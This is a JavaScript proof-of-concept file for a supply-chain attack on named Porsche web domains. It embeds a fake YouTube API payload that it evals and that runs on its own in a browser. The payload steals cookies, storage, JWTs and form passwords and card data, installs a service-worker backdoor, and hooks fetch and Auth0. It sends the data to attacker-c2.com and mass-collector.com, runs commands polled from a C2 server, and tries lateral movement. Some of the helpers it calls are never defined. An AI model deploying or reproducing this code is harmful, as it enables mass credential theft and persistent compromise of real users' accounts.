/**
 * PoC Script 3: Supply Chain Attack
 * Target: External dependencies and third-party services
 * Entry Point: Compromised external scripts (YouTube API, Auth0, etc.)
 * Impact: Mass compromise of all Porsche web applications
 */

class SupplyChainAttackPoC {
    constructor() {
        this.attackId = 'SUPPLY_CHAIN_' + Date.now();
        this.commandControlEndpoint = 'https://attacker-c2.com/supply-chain';
        this.massExfiltrationEndpoint = 'https://mass-collector.com/bulk-data';
        this.compromisedDependencies = [
            'https://www.youtube.com/iframe_api',
            'https://cdn.auth0.com/js/auth0/9.19.0/auth0.min.js',
            'https://www.google-analytics.com/analytics.js',
            'https://connect.facebook.net/en_US/fbevents.js'
        ];
    }

    /**
     * Phase 1: Simulate compromised external dependency
     * This represents what happens when a trusted external script is compromised
     */
    simulateCompromisedDependency() {
        console.log('[SUPPLY CHAIN] Simulating compromised external dependency');

        // Simulate YouTube API compromise (from banner.js vulnerability)
        const compromisedYouTubeAPI = `
            // Original YouTube API functionality (truncated)
            window.YT = window.YT || {};
            window.YT.Player = function(elementId, config) {
                // Normal YouTube player initialization...
                this.elementId = elementId;
                this.config = config;
                
                // MALICIOUS PAYLOAD INJECTION
                setTimeout(() => {
                    this.injectSupplyChainPayload();
                }, 1000);
            };
            
            window.YT.Player.prototype.injectSupplyChainPayload = function() {
                console.log('[SUPPLY CHAIN] YouTube API compromise payload executing');
                
                // Create supply chain attack instance
                const supplyChainAttack = new SupplyChainAttackInstance();
                supplyChainAttack.executeGlobalCompromise();
            };
            
            // Supply Chain Attack Implementation
            function SupplyChainAttackInstance() {
                this.attackId = '${this.attackId}';
                this.targetDomains = [
                    'porsche.com',
                    'porschedrive.porsche.com', 
                    'configurator.porsche.com',
                    'shop.porsche.com',
                    'connect-store.porsche.com'
                ];
                
                this.executeGlobalCompromise = function() {
                    console.log('[SUPPLY CHAIN] Executing global compromise across all Porsche domains');
                    
                    // Phase 1: Mass authentication theft
                    this.massAuthenticationTheft();
                    
                    // Phase 2: Deploy persistent backdoors
                    this.deployGlobalBackdoors();
                    
                    // Phase 3: Establish command & control
                    this.establishCommandControl();
                    
                    // Phase 4: Mass data exfiltration
                    this.massDataExfiltration();
                    
                    // Phase 5: Lateral movement
                    this.attemptLateralMovement();
                };
                
                this.massAuthenticationTheft = function() {
                    console.log('[SUPPLY CHAIN] Phase 1: Mass authentication theft');
                    
                    // Collect all authentication data from current domain
                    const authData = {
                        domain: window.location.hostname,
                        localStorage: this.extractAllLocalStorage(),
                        sessionStorage: this.extractAllSessionStorage(),
                        cookies: document.cookie,
                        tokens: this.extractAllTokens(),
                        userProfile: this.extractUserProfile()
                    };
                    
                    // Attempt cross-domain data collection
                    this.targetDomains.forEach(domain => {
                        if (domain !== window.location.hostname) {
                            this.attemptCrossDomainDataTheft(domain);
                        }
                    });
                    
                    // Exfiltrate collected data
                    this.exfiltrateData('mass_auth_theft', authData);
                };
                
                this.extractAllLocalStorage = function() {
                    const data = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        data[key] = localStorage.getItem(key);
                    }
                    return data;
                };
                
                this.extractAllSessionStorage = function() {
                    const data = {};
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        data[key] = sessionStorage.getItem(key);
                    }
                    return data;
                };
                
                this.extractAllTokens = function() {
                    const tokens = {};
                    const tokenKeys = Object.keys(localStorage).filter(key => 
                        key.includes('token') || 
                        key.includes('auth') || 
                        key.includes('jwt') ||
                        key.includes('session')
                    );
                    
                    tokenKeys.forEach(key => {
                        const value = localStorage.getItem(key);
                        try {
                            // Try to decode JWT tokens
                            if (value && value.includes('.')) {
                                const parts = value.split('.');
                                if (parts.length === 3) {
                                    tokens[key] = {
                                        raw: value,
                                        header: JSON.parse(atob(parts[0])),
                                        payload: JSON.parse(atob(parts[1])),
                                        signature: parts[2]
                                    };
                                }
                            } else {
                                tokens[key] = value;
                            }
                        } catch (e) {
                            tokens[key] = value;
                        }
                    });
                    
                    return tokens;
                };
                
                this.extractUserProfile = function() {
                    const profileKeys = [
                        'auth0.user_profile',
                        'user_profile', 
                        'customer_profile',
                        'porsche_user_data'
                    ];
                    
                    const profile = {};
                    profileKeys.forEach(key => {
                        const data = localStorage.getItem(key);
                        if (data) {
                            try {
                                profile[key] = JSON.parse(data);
                            } catch (e) {
                                profile[key] = data;
                            }
                        }
                    });
                    
                    return profile;
                };
                
                this.attemptCrossDomainDataTheft = function(targetDomain) {
                    console.log('[SUPPLY CHAIN] Attempting cross-domain theft from:', targetDomain);
                    
                    // Method 1: iframe-based data theft
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = 'https://' + targetDomain + '/';
                    
                    iframe.onload = () => {
                        try {
                            // Attempt to access iframe content (will fail due to CORS, but worth trying)
                            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                            if (iframeDoc) {
                                // Extract data if accessible
                                const scripts = iframeDoc.getElementsByTagName('script');
                                for (let script of scripts) {
                                    if (script.innerHTML.includes('localStorage') || script.innerHTML.includes('auth')) {
                                        console.log('[SUPPLY CHAIN] Found potential auth data in cross-domain iframe');
                                    }
                                }
                            }
                        } catch (e) {
                            console.log('[SUPPLY CHAIN] Cross-domain access blocked (expected):', e.message);
                        }
                        
                        // Remove iframe after attempt
                        setTimeout(() => {
                            document.body.removeChild(iframe);
                        }, 5000);
                    };
                    
                    document.body.appendChild(iframe);
                    
                    // Method 2: postMessage exploitation
                    window.addEventListener('message', (event) => {
                        if (event.origin.includes(targetDomain)) {
                            console.log('[SUPPLY CHAIN] Received cross-domain message:', event.data);
                            this.exfiltrateData('cross_domain_message', {
                                origin: event.origin,
                                data: event.data
                            });
                        }
                    });
                    
                    // Send probing messages
                    setTimeout(() => {
                        iframe.contentWindow.postMessage({
                            type: 'auth_request',
                            requestId: this.attackId
                        }, '*');
                    }, 2000);
                };
                
                this.deployGlobalBackdoors = function() {
                    console.log('[SUPPLY CHAIN] Phase 2: Deploying global backdoors');
                    
                    // Backdoor 1: Service Worker for all requests
                    this.deployServiceWorkerBackdoor();
                    
                    // Backdoor 2: Hook all fetch requests globally
                    this.hookGlobalFetch();
                    
                    // Backdoor 3: Hook authentication functions
                    this.hookAuthenticationFunctions();
                    
                    // Backdoor 4: DOM mutation observer for new content
                    this.deployDOMObserver();
                };
                
                this.deployServiceWorkerBackdoor = function() {
                    if ('serviceWorker' in navigator) {
                        const globalSWCode = \`
                            // Global Service Worker Backdoor
                            const ATTACK_ID = '${this.attackId}';
                            const C2_ENDPOINT = '${this.commandControlEndpoint}';
                            
                            // Intercept ALL network requests
                            self.addEventListener('fetch', function(event) {
                                const url = event.request.url;
                                const method = event.request.method;
                                
                                // Log all requests for reconnaissance
                                fetch(C2_ENDPOINT + '/request-log', {
                                    method: 'POST',
                                    body: JSON.stringify({
                                        attack_id: ATTACK_ID,
                                        url: url,
                                        method: method,
                                        headers: [...event.request.headers.entries()],
                                        timestamp: Date.now()
                                    })
                                }).catch(() => {});
                                
                                // Intercept authentication requests
                                if (url.includes('/auth') || url.includes('/login') || url.includes('/token')) {
                                    event.request.clone().text().then(body => {
                                        fetch(C2_ENDPOINT + '/auth-intercept', {
                                            method: 'POST',
                                            body: JSON.stringify({
                                                attack_id: ATTACK_ID,
                                                url: url,
                                                method: method,
                                                body: body,
                                                timestamp: Date.now()
                                            })
                                        }).catch(() => {});
                                    });
                                }
                                
                                // Intercept API calls with sensitive data
                                if (url.includes('/api/') && (
                                    url.includes('user') || 
                                    url.includes('customer') || 
                                    url.includes('vehicle') ||
                                    url.includes('payment')
                                )) {
                                    event.request.clone().text().then(body => {
                                        fetch(C2_ENDPOINT + '/api-intercept', {
                                            method: 'POST',
                                            body: JSON.stringify({
                                                attack_id: ATTACK_ID,
                                                url: url,
                                                api_data: body,
                                                timestamp: Date.now()
                                            })
                                        }).catch(() => {});
                                    });
                                }
                                
                                // Allow original request to proceed
                                event.respondWith(fetch(event.request));
                            });
                            
                            // Periodic beacon to maintain C2 connection
                            setInterval(() => {
                                fetch(C2_ENDPOINT + '/beacon', {
                                    method: 'POST',
                                    body: JSON.stringify({
                                        attack_id: ATTACK_ID,
                                        type: 'service_worker_active',
                                        domain: self.location.hostname,
                                        timestamp: Date.now()
                                    })
                                }).catch(() => {});
                            }, 30000); // Every 30 seconds
                        \`;
                        
                        const swBlob = new Blob([globalSWCode], {type: 'application/javascript'});
                        const swUrl = URL.createObjectURL(swBlob);
                        
                        navigator.serviceWorker.register(swUrl).then(registration => {
                            console.log('[SUPPLY CHAIN] Global Service Worker backdoor deployed');
                        }).catch(error => {
                            console.log('[SUPPLY CHAIN] Service Worker deployment failed:', error);
                        });
                    }
                };
                
                this.hookGlobalFetch = function() {
                    const originalFetch = window.fetch;
                    const self = this;
                    
                    window.fetch = function(...args) {
                        const [url, options] = args;
                        
                        // Log all fetch requests
                        self.exfiltrateData('fetch_intercept', {
                            url: url,
                            options: options,
                            timestamp: Date.now()
                        });
                        
                        // Intercept responses
                        return originalFetch.apply(this, args).then(response => {
                            // Clone response to read data
                            const clonedResponse = response.clone();
                            
                            // Check for sensitive data in responses
                            if (url.includes('/api/') || url.includes('/auth/')) {
                                clonedResponse.text().then(responseText => {
                                    self.exfiltrateData('response_intercept', {
                                        url: url,
                                        response: responseText,
                                        status: response.status,
                                        timestamp: Date.now()
                                    });
                                }).catch(() => {});
                            }
                            
                            return response;
                        });
                    };
                };
                
                this.hookAuthenticationFunctions = function() {
                    // Hook localStorage setItem for auth data
                    const originalSetItem = localStorage.setItem;
                    const self = this;
                    
                    localStorage.setItem = function(key, value) {
                        if (key.includes('auth') || key.includes('token') || key.includes('session')) {
                            self.exfiltrateData('auth_storage_intercept', {
                                key: key,
                                value: value,
                                timestamp: Date.now()
                            });
                        }
                        return originalSetItem.call(this, key, value);
                    };
                    
                    // Hook common authentication libraries
                    if (window.Auth0) {
                        const originalAuth0 = window.Auth0;
                        window.Auth0 = function(...args) {
                            const auth0Instance = new originalAuth0(...args);
                            
                            // Hook token methods
                            const originalGetTokenSilently = auth0Instance.getTokenSilently;
                            auth0Instance.getTokenSilently = function(...tokenArgs) {
                                return originalGetTokenSilently.apply(this, tokenArgs).then(token => {
                                    self.exfiltrateData('auth0_token_intercept', {
                                        token: token,
                                        timestamp: Date.now()
                                    });
                                    return token;
                                });
                            };
                            
                            return auth0Instance;
                        };
                    }
                };
                
                this.deployDOMObserver = function() {
                    const self = this;
                    
                    const observer = new MutationObserver(function(mutations) {
                        mutations.forEach(function(mutation) {
                            if (mutation.addedNodes) {
                                mutation.addedNodes.forEach(function(node) {
                                    if (node.nodeType === 1) { // Element node
                                        // Look for forms with sensitive data
                                        if (node.tagName === 'FORM' || node.querySelector('form')) {
                                            self.hookSensitiveForms(node);
                                        }
                                        
                                        // Look for script tags with auth data
                                        if (node.tagName === 'SCRIPT') {
                                            const scriptContent = node.innerHTML || node.textContent;
                                            if (scriptContent.includes('token') || scriptContent.includes('auth')) {
                                                self.exfiltrateData('script_content_intercept', {
                                                    content: scriptContent,
                                                    timestamp: Date.now()
                                                });
                                            }
                                        }
                                    }
                                });
                            }
                        });
                    });
                    
                    observer.observe(document.body, {
                        childList: true,
                        subtree: true
                    });
                };
                
                this.hookSensitiveForms = function(formElement) {
                    const forms = formElement.tagName === 'FORM' ? [formElement] : formElement.querySelectorAll('form');
                    const self = this;
                    
                    forms.forEach(form => {
                        form.addEventListener('submit', function(event) {
                            const formData = new FormData(form);
                            const formObject = {};
                            
                            for (let [key, value] of formData.entries()) {
                                formObject[key] = value;
                            }
                            
                            // Check for sensitive form data
                            const sensitiveFields = ['password', 'email', 'username', 'token', 'credit_card', 'ssn'];
                            const hasSensitiveData = Object.keys(formObject).some(key => 
                                sensitiveFields.some(sensitive => key.toLowerCase().includes(sensitive))
                            );
                            
                            if (hasSensitiveData) {
                                self.exfiltrateData('form_intercept', {
                                    form_action: form.action,
                                    form_data: formObject,
                                    timestamp: Date.now()
                                });
                            }
                        });
                    });
                };
                
                this.establishCommandControl = function() {
                    console.log('[SUPPLY CHAIN] Phase 3: Establishing command & control');
                    
                    // Register with C2 server
                    this.registerWithC2();
                    
                    // Set up command polling
                    this.startCommandPolling();
                    
                    // Set up WebSocket connection if available
                    this.establishWebSocketC2();
                };
                
                this.registerWithC2 = function() {
                    const registrationData = {
                        attack_id: this.attackId,
                        domain: window.location.hostname,
                        user_agent: navigator.userAgent,
                        capabilities: [
                            'data_exfiltration',
                            'token_theft', 
                            'form_interception',
                            'api_monitoring',
                            'cross_domain_probing'
                        ],
                        timestamp: Date.now()
                    };
                    
                    fetch('${this.commandControlEndpoint}/register', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(registrationData)
                    }).catch(() => {
                        console.log('[SUPPLY CHAIN] C2 registration failed, operating in autonomous mode');
                    });
                };
                
                this.startCommandPolling = function() {
                    const self = this;
                    
                    setInterval(() => {
                        fetch('${this.commandControlEndpoint}/commands/' + this.attackId)
                            .then(response => response.json())
                            .then(commands => {
                                commands.forEach(command => {
                                    self.executeCommand(command);
                                });
                            })
                            .catch(() => {
                                // Silent fail - C2 might be down
                            });
                    }, 60000); // Poll every minute
                };
                
                this.executeCommand = function(command) {
                    console.log('[SUPPLY CHAIN] Executing C2 command:', command.type);
                    
                    switch (command.type) {
                        case 'exfiltrate_all':
                            this.massDataExfiltration();
                            break;
                        case 'execute_script':
                            try {
                                eval(command.script);
                            } catch (e) {
                                console.log('[SUPPLY CHAIN] Script execution failed:', e);
                            }
                            break;
                        case 'steal_specific_data':
                            this.stealSpecificData(command.target);
                            break;
                        case 'deploy_additional_backdoor':
                            this.deployAdditionalBackdoor(command.backdoor_code);
                            break;
                        default:
                            console.log('[SUPPLY CHAIN] Unknown command type:', command.type);
                    }
                };
                
                this.massDataExfiltration = function() {
                    console.log('[SUPPLY CHAIN] Phase 4: Mass data exfiltration');
                    
                    const massExfiltrationPackage = {
                        attack_id: this.attackId,
                        domain: window.location.hostname,
                        timestamp: Date.now(),
                        data: {
                            localStorage: this.extractAllLocalStorage(),
                            sessionStorage: this.extractAllSessionStorage(),
                            cookies: document.cookie,
                            tokens: this.extractAllTokens(),
                            userProfile: this.extractUserProfile(),
                            domContent: this.extractSensitiveDOMContent(),
                            networkRequests: this.getInterceptedRequests()
                        }
                    };
                    
                    // Send to mass collection endpoint
                    fetch('${this.massExfiltrationEndpoint}', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(massExfiltrationPackage)
                    }).catch(() => {
                        // Fallback: store locally for later retrieval
                        localStorage.setItem('mass_exfil_' + Date.now(), JSON.stringify(massExfiltrationPackage));
                    });
                };
                
                this.extractSensitiveDOMContent = function() {
                    const sensitiveContent = {};
                    
                    // Extract form data
                    const forms = document.querySelectorAll('form');
                    sensitiveContent.forms = Array.from(forms).map(form => ({
                        action: form.action,
                        method: form.method,
                        fields: Array.from(form.elements).map(element => ({
                            name: element.name,
                            type: element.type,
                            value: element.value
                        }))
                    }));
                    
                    // Extract meta tags
                    const metaTags = document.querySelectorAll('meta');
                    sensitiveContent.metaTags = Array.from(metaTags).map(meta => ({
                        name: meta.name,
                        content: meta.content,
                        property: meta.property
                    }));
                    
                    // Extract script contents
                    const scripts = document.querySelectorAll('script');
                    sensitiveContent.scripts = Array.from(scripts)
                        .filter(script => script.innerHTML.includes('token') || script.innerHTML.includes('auth'))
                        .map(script => script.innerHTML);
                    
                    return sensitiveContent;
                };
                
                this.attemptLateralMovement = function() {
                    console.log('[SUPPLY CHAIN] Phase 5: Attempting lateral movement');
                    
                    // Try to access other Porsche subdomains
                    this.targetDomains.forEach(domain => {
                        if (domain !== window.location.hostname) {
                            this.attemptSubdomainCompromise(domain);
                        }
                    });
                    
                    // Try to access internal APIs
                    this.probeInternalAPIs();
                    
                    // Try to escalate to admin interfaces
                    this.attemptAdminEscalation();
                };
                
                this.attemptSubdomainCompromise = function(subdomain) {
                    // Create hidden iframe to attempt subdomain access
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = 'https://' + subdomain + '/';
                    
                    iframe.onload = () => {
                        // Try to inject our payload into the subdomain
                        try {
                            const iframeWindow = iframe.contentWindow;
                            if (iframeWindow) {
                                // Attempt to execute our payload in the subdomain context
                                iframeWindow.eval(\`
                                    console.log('[SUPPLY CHAIN] Lateral movement to ${subdomain} successful');
                                    // Re-execute supply chain attack in new domain
                                    (${this.executeGlobalCompromise.toString()})();
                                \`);
                            }
                        } catch (e) {
                            console.log('[SUPPLY CHAIN] Lateral movement to', subdomain, 'blocked:', e.message);
                        }
                        
                        setTimeout(() => {
                            document.body.removeChild(iframe);
                        }, 10000);
                    };
                    
                    document.body.appendChild(iframe);
                };
                
                this.exfiltrateData = function(type, data) {
                    const exfiltrationPackage = {
                        attack_id: this.attackId,
                        type: type,
                        data: data,
                        domain: window.location.hostname,
                        timestamp: Date.now()
                    };
                    
                    // Multiple exfiltration methods
                    const methods = [
                        () => fetch('${this.commandControlEndpoint}/data', {
                            method: 'POST',
                            body: JSON.stringify(exfiltrationPackage)
                        }),
                        () => {
                            const img = new Image();
                            img.src = '${this.commandControlEndpoint}/img?' + btoa(JSON.stringify(exfiltrationPackage));
                        },
                        () => localStorage.setItem('exfil_' + Date.now(), JSON.stringify(exfiltrationPackage))
                    ];
                    
                    // Try each method
                    methods.forEach(method => {
                        try {
                            method();
                        } catch (e) {
                            // Silent fail, try next method
                        }
                    });
                };
            }
        `;

        return compromisedYouTubeAPI;
    }

    /**
     * Execute the supply chain attack simulation
     */
    async executeAttack() {
        try {
            console.log('[SUPPLY CHAIN] Starting supply chain attack simulation...');
            
            // Simulate the compromised dependency
            const compromisedScript = this.simulateCompromisedDependency();
            
            // In a real attack, this would be injected by compromising the actual external script
            // For demonstration, we'll execute it directly
            eval(compromisedScript);
            
            console.log('[SUPPLY CHAIN] Supply chain attack simulation completed');
            
            // Show impact assessment
            this.showSupplyChainImpact();
            
        } catch (error) {
            console.error('[SUPPLY CHAIN] Attack simulation failed:', error);
        }
    }

    /**
     * Show the impact of a successful supply chain attack
     */
    showSupplyChainImpact() {
        const impact = {
            scope: 'Global - All Porsche web applications',
            affected_users: 'All users across all Porsche domains',
            compromised_data: [
                'All authentication tokens',
                'Customer personal data',
                'Vehicle configurations',
                'Payment information',
                'Admin credentials',
                'API keys and secrets'
            ],
            attack_capabilities: [
                'Mass data exfiltration',
                'Real-time request interception', 
                'Cross-domain compromise',
                'Persistent backdoor access',
                'Command & control communication',
                'Lateral movement to internal systems'
            ],
            business_impact: [
                'Complete brand compromise',
                'Massive data breach',
                'Regulatory violations (GDPR, PCI-DSS)',
                'Customer trust destruction',
                'Financial losses',
                'Legal liability'
            ]
        };

        console.log('[SUPPLY CHAIN] Impact Assessment:', impact);

        // Visual demonstration
        if (typeof document !== 'undefined') {
            const impactDisplay = document.createElement('div');
            impactDisplay.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(255, 0, 0, 0.9);
                color: white;
                z-index: 999999;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                font-family: Arial, sans-serif;
                text-align: center;
            `;

            impactDisplay.innerHTML = `
                <h1>🚨 SUPPLY CHAIN ATTACK SUCCESSFUL 🚨</h1>
                <h2>GLOBAL PORSCHE COMPROMISE</h2>
                <div style="max-width: 800px; text-align: left; background: rgba(0,0,0,0.5); padding: 20px; border-radius: 10px;">
                    <h3>Compromised Systems:</h3>
                    <ul>
                        <li>✅ All Porsche web applications</li>
                        <li>✅ Customer authentication systems</li>
                        <li>✅ Admin panels and management interfaces</li>
                        <li>✅ Payment processing systems</li>
                        <li>✅ Vehicle configuration systems</li>
                    </ul>
                    
                    <h3>Attack Capabilities:</h3>
                    <ul>
                        <li>🔥 Real-time data interception</li>
                        <li>🔥 Mass authentication theft</li>
                        <li>🔥 Cross-domain compromise</li>
                        <li>🔥 Persistent backdoor access</li>
                        <li>🔥 Command & control communication</li>
                    </ul>
                    
                    <h3>Business Impact:</h3>
                    <ul>
                        <li>💥 Complete brand compromise</li>
                        <li>💥 Massive customer data breach</li>
                        <li>💥 Regulatory violations</li>
                        <li>💥 Financial losses in millions</li>
                        <li>💥 Irreparable reputation damage</li>
                    </ul>
                </div>
                <button onclick="this.parentElement.remove()" style="margin-top: 20px; padding: 10px 20px; font-size: 16px; background: white; color: red; border: none; border-radius: 5px; cursor: pointer;">
                    Close Impact Assessment
                </button>
            `;

            document.body.appendChild(impactDisplay);
        }
    }
}

// Auto-execute if in browser environment
if (typeof window !== 'undefined') {
    const supplyChainAttack = new SupplyChainAttackPoC();
    supplyChainAttack.executeAttack();
}

// Export for manual execution
if (typeof module !== 'undefined' && module.exports) {
    module.exports = SupplyChainAttackPoC;
}